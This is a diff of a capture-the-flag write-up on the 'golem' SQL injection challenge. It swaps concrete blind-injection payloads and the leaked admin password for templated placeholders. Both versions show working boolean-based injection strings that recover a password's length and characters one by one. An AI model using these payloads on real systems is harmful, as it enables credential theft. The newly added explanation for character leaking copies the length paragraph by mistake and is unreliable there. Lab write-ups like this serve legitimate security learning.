@@ -31,49 +31,18 @@ First we have to reveal the length of the flag.
 If we provide the following URI parameter:
 
 ```
-?pw=' || id LIKE 'admin' %26%26 length(pw) LIKE 1 -- -
+?pw=' || id LIKE 'admin' %26%26 length(pw) LIKE [lemgth] -- -
 ```
 
 The resultant query becomes:
 
 ```sql
-SELECT id FROM prob_golem WHERE id='admin' AND pw='' || id LIKE 'admin' && length(pw) LIKE 1 -- -'
-
-## Queried part:
-SELECT id FROM prob_golem WHERE id='admin' AND pw='' || id LIKE 'admin' && length(pw) LIKE 1
-
-## Commented part:
-'
+SELECT id FROM prob_golem WHERE id='admin' AND pw='' || id LIKE 'admin' && length(pw) LIKE [lemgth] -- -'
 ```
 
-![2](https://github.com/Kunull/Write-ups/assets/110326359/34e0d15d-bb1c-43c8-a2a2-03ec0cbec69b)
-
-Since the `Hello admin` message is not printed, we know that the resultant query did not result in `True`.
-That tells us that the length of the `pw` column is more than 1.
-
-If we keep increasing the length and provide the following URI parameter:
-
-```
-?pw=' || id LIKE 'admin' %26%26 length(pw) LIKE 8 -- -
-```
-
-The resultant query becomes:
-
-```sql
-SELECT id FROM prob_golem WHERE id='admin' AND pw='' || id LIKE 'admin' && length(pw) LIKE 8 -- -'
-
-## Queried part:
-SELECT id FROM prob_golem WHERE id='admin' AND pw='' || id LIKE 'admin' && length(pw) LIKE 8
-
-## Commented part:
-'
-```
-
-![3](https://github.com/Kunull/Write-ups/assets/110326359/eacec623-361b-4530-b07b-b10699861646)
-
-Since the `Hello admin` message is printed, we know that the resultant query resulted in `True`.
-That tells us that the length of the `pw` column is 8.
-
+When the length of `pw` for `id='admin'` is equal to the `[length]` that we provide, the query will result into `True`. 
+This will cause the `Hello admin` message to be printed. 
+We can brute force the length and use the message as an indicator of correct brute force value.
 
 ### Leaking the password
 
@@ -86,76 +55,19 @@ Next, we can leak the password byte by byte using the `substr()` function.
 If we provide the following URI parameter:
 
 ```
-?pw=' || id LIKE 'admin' %26%26 substring(pw, 1, 1) LIKE '0' -- -
+?pw=' || id LIKE 'admin' %26%26 substring(pw, [index], 1) LIKE '[character]' -- -
 ```
 
 The resultant query becomes:
 
 ```sql
-SELECT id FROM prob_golem WHERE id='admin' AND pw='' || id LIKE 'admin' %26%26 substring(pw, 1, 1) LIKE '0' -- -'
-
-## Queried part:
-SELECT id FROM prob_golem WHERE id='admin' AND pw='' || id LIKE 'admin' %26%26 substring(pw, 1, 1) LIKE '0'
-
-## Commented part:
-'
+SELECT id FROM prob_golem WHERE id='admin' AND pw='' || id LIKE 'admin' %26%26 substring(pw, [index], 1) LIKE '[character]' -- -'
 ```
 
-![4](https://github.com/Kunull/Write-ups/assets/110326359/c13d9b1f-2d75-43fc-9d07-9845caf35c90)
+When the length of `pw` for `id='admin'` is equal to the `[length]` that we provide, the query will result into `True`. 
+This will cause the `Hello admin` message to be printed. 
+We can brute force the length and use the message as an indicator of correct brute force value.
 
-Since the `Hello admin` message is not printed, we know that the resultant query did not result in `True`.
-
-That tells us that the first character of the `pw` for `id=admin` is not `0`.
-
-We can try other characters moving up to the following:
-
-```
-?pw=' || id LIKE 'admin' %26%26 substring(pw, 1, 1) LIKE '7' -- -
-```
-
-The resultant query then becomes:
-
-```sql
-SELECT id FROM prob_golem WHERE id='admin' AND pw='' || id LIKE 'admin' %26%26 substring(pw, 1, 1) LIKE '7' -- -'
-
-## Queried part:
-SELECT id FROM prob_golem WHERE id='admin' AND pw='' || id LIKE 'admin' %26%26 substring(pw, 1, 1) LIKE '7'
-
-## Commented part:
-'
-```
-
-![5](https://github.com/Kunull/Write-ups/assets/110326359/d89bfdba-6af8-44c9-9881-968141be2efa)
-
-We can move onto the next characters:
-
-```
-?pw=' || id LIKE 'admin' %26%26 substring(pw, 2, 1) LIKE '0' -- -
-```
-
-The resultant query then becomes:
-
-```sql
-SELECT id FROM prob_golem WHERE id='admin' AND pw='' || id LIKE 'admin' %26%26 substring(pw, 2, 1) LIKE '0' -- -'
-
-## Queried part:
-SELECT id FROM prob_golem WHERE id='admin' AND pw='' || id LIKE 'admin' %26%26 substring(pw, 2, 1) LIKE '0'
-
-## Commented part:
-'
-```
-
-![6](https://github.com/Kunull/Write-ups/assets/110326359/f0b3cf8f-0dde-461d-a853-a9a0ebbd8b47)
-
-Since the `Hello admin` message is not printed, we know that the resultant query did not result in `True`.
-
-That tells us that the second character of the `pw` for `id=admin` is not `0`.
-
-We can keep repeating this process until we get all the eight characters of the `admin` password:
-
-```
-77d6290b
-```
 
 ### Script
 
